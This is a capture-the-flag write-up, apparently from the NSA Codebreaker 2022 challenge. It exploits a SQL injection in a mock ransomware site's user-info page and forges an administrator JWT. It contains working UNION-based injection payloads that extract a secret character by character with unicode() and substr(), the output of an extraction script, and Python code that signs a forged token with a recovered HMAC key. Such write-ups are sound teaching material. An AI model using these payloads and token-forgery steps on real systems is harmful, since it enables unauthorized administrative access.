# Task 7 - Privilege Escalation

<div align="center">
<img src="https://img.shields.io/badge/categories-Web%20Hacking%2C%20%5Bredacted%5D-informational">
<img src="https://img.shields.io/badge/points-300-success">
<img src="https://img.shields.io/badge/tools-Python-blueviolet">
</div>

> With access to the site, you can access most of the functionality. But there's still that admin area that's locked off.
>
> Generate a new token value which will allow you to access the ransomware site *as an administrator.*
>
> Prompt:
>
> - Enter a token value which will allow you to login as an administrator.

## Solution

Obviously we have access to the main ransomware-as-a-service website at this point, where to go from here wasn't super obvious to me initially (or anyone I would think haha) so I decided to poke around to see what I could do.

### Exploration

The home page we saw at the end of task 6 isn't too remarkable:

<div align="center">
<img src="../task6/img/website%20homepage.png">
</div>

Hopefully that key database rollback won't affect us (hint: foreshadowing :)). Other than that, though, we don't really get much information. Onto the next page, "Generate Key":

<div align="center">
<img src="img/generatekey.png">
</div>

Man, the attacker didn't leave any credit for us? I guess we can't really do much with this page either. Onto "Unlock Request" I guess:

<div align="center">
<img src="img/unlockreq.png">
</div>

It wants a receipt? Not really sure where we'd get that. Next!

<div align="center">
<img src="img/adminlist.png">
</div>

Now this looks interesting. Looks like the only admin left is NervousHiccups, so I assume that's who we're gonna have to impersonate. I can't help but feel bad for the other admins though, especially evil rock :(

Onto "User Info:"

<div align="center">
<img src="img/userinfo.png">
</div>

That's a username and a half :) Seems like our attacker was pretty helpful on this website. This page seems interesting though since all of the information displayed on it is probably loaded from a database somewhere. Maybe this will be how we get an admin token? I'll look at the other two pages before trying anything though :)

<div align="center">
<img src="img/forum.png">
</div>

The home page mentioned the forum page was down, and I can't click on any of the pages so this is pretty useless. The admin page looks interesting though:

<div align="center">
<img src="img/admin-warning.png">
</div>

Or not, hopefully nothing bad will come from the logging of this attempt D:

### Backend analysis (part 2)

I figured I'd take a look at the [website source recovered in task B2](../task-B2/server-files/app/server.py) again to check if there was anything interesting, and lo and behold I found this function:

```python
# app/server.py, lines 26-50
def userinfo():
    """ Create a page that displays information about a user """
    query = request.values.get('user')
    if query == None:
        query =  util.get_username()
    userName = memberSince = clientsHelped = hackersHelped = contributed = ''
    with util.userdb() as con:
        # this is where the query's constructed via % formatting:
        infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
        row = con.execute(infoquery).fetchone()
        if row != None:
            userName = query
            memberSince = int(row[0])
            clientsHelped = int(row[1])
            hackersHelped = int(row[2])
            contributed = int(row[3])
```

So apparently there's a query argument for getting information about a specific user, but more interestingly, that username is directly interpolated into the database request without escaping. This allows us to perform SQL injection via that query parameter :) Now it's only a matter of crafting the right query to give us NervousHiccups' secret and user id.

### Querycrafting

Let's review how the login tokens are generated by the server:

```python
# app/util.py - lines 59-69
def generate_token(userName):
    """ Generate a new login token for the given user, good for 30 days"""
    with userdb() as con:
        row = con.execute("SELECT uid, secret from Accounts WHERE userName = ?", (userName,)).fetchone()
        now = datetime.now()
        exp = now + timedelta(days=30)
        claims = {'iat': now,
                  'exp': exp,
                  'uid': row[0],
                  'sec': row[1]}
        return jwt.encode(claims, hmac_key(), algorithm='HS256')
```

So we know that the userid (`uid`) and secret (`sec`) are located within the Accounts table in the user database.
We also know that the SQLite query parameter system is used properly here (based on the `username = ?`), which is weird since it's inconsistent but ultimately irrelevant :)

In this case, [SQL's `UNION` operator](https://www.sqlite.org/lang_select.html#compound) will be our friend in selecting fields from tables that we shouldn't be able to. It requires that the queries to its left and right have the same number of columns, so a query like this might be tempting:

```sql
-- 4 columns in original query
SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed
FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid 
WHERE a.userName=''
-- 4 columns in injected query
UNION SELECT uid, uid, secret, length(secret) FROM Accounts WHERE userName = 'NervousHiccups'
```

In that case, our payload would be `' UNION SELECT uid, uid, secret, length(secret) FROM Accounts WHERE userName = 'NervousHiccups`.
The first quote closes off the `a.userName` string (making the first query match nothing) and it doesn't have an ending quote because one already exists in the full query string.
However, when we try to provide this as a user, we get an error from the website:

<div align="center">
<img src="img/internal-error.png" alt="Internal server error from initial SQL injection">
</div>

Huh, that's weird. What if we just try selecting the uid 4 times?

<div align="center">
<img src="img/uid-4x.png" alt="Successful SQL injection by selecting uid 4 times">
</div>

So the SQL injection is working, there's just something that makes the server error on our original payload.
Looking back at the `userinfo()` page function in `app/server.py` reveals why:

```python
# app/server.py - lines 35-40
# --snip--
        if row != None:
            userName = query
            memberSince = int(row[0])
            clientsHelped = int(row[1])
            hackersHelped = int(row[2])
            contributed = int(row[3])
```

So all 4 of the columns returned by the database query are casted to integers.
That explains why selecting `uid` 4 times worked, but our original query didn't: `secret` is a (non-numeric) string, so when `int()` is called on it Python probably throws an error.

So how might we go about converting the secret string to an integer?
Well, a string is essentially just a sequence of bytes representing characters, with common encoding schemes including [ASCII](https://en.wikipedia.org/wiki/ASCII) and [UTF-8](https://en.wikipedia.org/wiki/UTF-8).
We learned that our secret was `1uT153kUHMMHrqqqEKak0KSqyS4vdwTi` in [task 6](https://github.com/5t0n3/nsa-codebreaker-22/tree/main/task6#solution), so it should be safe to assume that each byte corresponds to one character in NervousHiccups' secret as well (i.e. there's probably no emojis or characters outside of the Latin alphabet).
Luckily, SQLite has the [`unicode()`](https://www.sqlite.org/lang_corefunc.html#unicode) function which gives us the Unicode code point of a character, which in this case is the same as the ASCII codepoint.
We also need to compose it with the [`substr()`](https://www.sqlite.org/lang_corefunc.html#substr) function though, since `unicode()` only gives us the codepoint of the first character of a string.
Using those two functions, we can construct a query that doesn't throw an error! Here's the result from using the payload `' UNION SELECT uid, unicode(substr(secret, 1, 1)), length(secret), uid from Accounts WHERE userName = 'NervousHiccups` (yes SQL 1-indexes their strings haha):

<div align="center">
<img src="img/first-char.png" alt="User info page with first secret character codepoint">
</div>

Oh, I guess the date is different since it's a timestamp, oh well :) From that query, we get some useful information though:

- The first character of NervousHiccups' secret is `T` (ASCII codepoint 84)
- There are 32 characters in NervousHiccups' secret
- NervousHiccups' `uid` is 16498

Neat! We could go through and manually increment the index in the `substr()` call to get the full secret (that's what I did initially), but eventually I decided to write up [a Python script](./get_admin_secret.py) do automate that for me :)
It uses BeautifulSoup to parse the HTML received from each request and prints out the secret as it gets each character.
Each of the information boxes is a `div` element with the `box` class, which you can filter for using BeautifulSoup.
Here's the output from running it (skipping some intermediary prints to not take up too much space :)):

```shell
$ python get_admin_secret.py
T_______________________________
TQ______________________________
TQ9_____________________________
TQ9m____________________________
# --snip--
TQ9mpDdETkLCarLuyggyK8eDvJYES___
TQ9mpDdETkLCarLuyggyK8eDvJYESL__
TQ9mpDdETkLCarLuyggyK8eDvJYESLj_
TQ9mpDdETkLCarLuyggyK8eDvJYESLjA
================================
Full admin secret: TQ9mpDdETkLCarLuyggyK8eDvJYESLjA
NervousHiccups uid: 16498
```

And there's both of the pieces of information we need!
I just used PyJWT again to forge the login token since it worked well for task 6:

```python
import datetime

import jwt

HMAC_KEY = "xqDxTAQBYw4hEsK8ud3ASezUM4IohDW1"

if __name__ == "__main__":
    now = datetime.datetime.now(tz=datetime.timezone.utc)

    admin_jwt = {
        "iat": now,
        "exp": now + datetime.timedelta(days=365),
        "sec": "TQ9mpDdETkLCarLuyggyK8eDvJYESLjA",
        "uid": 16498
    }
    
    print(jwt.encode(admin_jwt, HMAC_KEY, algorithm='HS256'))
```

And now, the moment we've been waiting for:

```shell
$ python forge_admin_token.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjU4Njk2NzYsImV4cCI6MTY5NzQwNTY3Niwic2VjIjoiVFE5bXBEZEVUa0xDYXJMdXlnZ3lLOGVEdkpZRVNMakEiLCJ1aWQiOjE2NDk4fQ.CIU10maeb-jW5F5KSSUTyF_VsZl-FcYTVnhZu7zUMDE
```

Nice! Now we can replace the value of the `tok` cookie with this value and poke around the admin page:

<div align="center">
<img src="img/admin-page.png" alt="RansomMeThis admin page">
</div>
